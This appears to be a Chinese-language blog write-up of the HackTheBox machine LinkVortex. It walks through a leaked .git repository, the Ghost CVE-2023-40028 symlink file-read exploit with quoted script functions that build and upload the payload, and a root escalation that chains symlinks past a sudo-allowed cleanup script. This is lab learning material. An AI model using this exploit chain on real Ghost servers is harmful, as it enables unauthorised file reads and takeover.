---
title: LinkVortex | HackTheBox
date: 2024-12-19 10:52:15
tags:
    - HTB
    - ghost
    - cve
excerpt: Ghost | CVE-2023-40028 | Symbolic link
---

## LinkVortex

> 需要先把 linkvortex.htb 加入 /etc/hosts

### List dir

- ffuf 找到 `dev.linkvortex.htb`
![截圖 2024-12-11 15.22.01](https://hackmd.io/_uploads/H18iThUNJe.png)

- 再一次找到 `dev.linkvortex.htb/.git` 可以成功連上
![截圖 2024-12-11 15.23.55](https://hackmd.io/_uploads/H1LzChINJl.png)

成功存取 .git 我們就可以把 git dump 下來還原出整個站的 repo

![截圖 2024-12-11 15.50.40](https://hackmd.io/_uploads/HklR846L41x.png)

### Exploitation

- dump .git 找到 ghost admin 的 password
![image](https://hackmd.io/_uploads/BkuCbvlHyx.png)

- 使用 CVE-2023-40028 [爆破腳本](https://github.com/0xyassine/CVE-2023-40028/blob/master/CVE-2023-40028.sh)  得到 ghost 的 shell

<img src="https://hackmd.io/_uploads/r1In_IxBkg.png" width="350">
<img src="https://hackmd.io/_uploads/rJIYdLeH1g.png" width="350">

- /var/lib/ghost/config.production.json 的作用
    1. 配置 Ghost 應用的生產環境。
    2. 定義應用程序的關鍵參數，例如：
        - 網站 URL
        - 資料庫連接
        - 郵件發送服務

找到 SMTP bob 的帳號密碼
ssh 過去就可以拿到 user.txt

### Get root.txt

- `sudo -l`
![image](https://hackmd.io/_uploads/BJbRoLlrJx.png)
`(ALL) NOPASSWDL: /usr/bin/bash /opt/ghost/clen_symlink.sh *.png`

- `/opt/ghost/clean_symlink.sh`

```bash=
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then ## SET CHECK_CONTENT=ture
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  
  # 這邊如果發現 link 到 root or etc 就擋掉了，所以需要建立兩次連結
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

![image](https://hackmd.io/_uploads/SyBUwLgryg.png)

我們想讓這個 `.sh` cat 出 root.txt 的content 所以就按照上面的設定；Symbolic link 在移動時會印出檔案內容

- Flag.txt 的權限會是 bob，bob 再 `ln -s /home/bob/flag.txt flag.png`

### Pwned

[![image](https://hackmd.io/_uploads/Sy0Rw8xryx.png)](https://www.hackthebox.com/achievement/machine/1297180/638)

[](https://medium.com/@mukhammadiyev20040/linkvortex-htb-write-up-5fbc66cc0081)

## CVE-2023-40028

CVE-2023-40028 存在於 Ghost@5.59.1 版本之前的版本中。 該漏洞允許**經過身份驗證**的用戶上傳符號連結（symlink）文件，從而可能導致對主機操作系統上任意文件的讀取。

```bash genrate_exp
function generate_exploit()
{
  local FILE_TO_READ=$1
  IMAGE_NAME=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 13; echo)
  mkdir -p $PAYLOAD_PATH/content/images/2024/
  ln -s $FILE_TO_READ $PAYLOAD_PATH/content/images/2024/$IMAGE_NAME.png
  zip -r -y $PAYLOAD_ZIP_NAME $PAYLOAD_PATH/ &>/dev/null
}
```

- `FILE_TO_READ=$1` function 參數 1
- 建立 要讀取檔案的 symbolic link
- `zip -y` 保留 symbolic link

```bash Get user cookie and send

#CREATE COOKIE
curl -c cookie.txt -d username=$USERNAME -d password=$PASSWORD \
   -H "Origin: $GHOST_URL" \
   -H "Accept-Version: v3.0" \
   $GHOST_API/session/ &> /dev/null

if ! cat cookie.txt | grep -q ghost-admin-api-session;then
  echo "[!] INVALID USERNAME OR PASSWORD"
  rm cookie.txt
  exit
fi

function send_exploit()
{
  RES=$(curl -s -b cookie.txt \
  -H "Accept: text/plain, */*; q=0.01" \
  -H "Accept-Language: en-US,en;q=0.5" \
  -H "Accept-Encoding: gzip, deflate, br" \
  -H "X-Ghost-Version: 5.58" \
  -H "App-Pragma: no-cache" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Content-Type: multipart/form-data" \
  -X POST \
  -H "Origin: $GHOST_URL" \
  -H "Referer: $GHOST_URL/ghost/" \
  -F "importfile=@`dirname $PAYLOAD_PATH`/$PAYLOAD_ZIP_NAME;type=application/zip" \
  -H "form-data; name=\"importfile\"; filename=\"$PAYLOAD_ZIP_NAME\"" \
  -H "Content-Type: application/zip" \
  -J \
  "$GHOST_URL/ghost/api/v3/admin/db")
  if [ $? -ne 0 ];then
    echo "[!] FAILED TO SEND THE EXPLOIT"
    clean
    exit
  fi
}
```

- 拿到 admin 的 session
- POST 傳送 symbolic link 的 zip file

`curl -b cookie.txt -s $GHOST_URL/content/images/2024/$IMAGE_NAME.png`

- 附上 cookie 請求 Symbolic link 的 image 實體
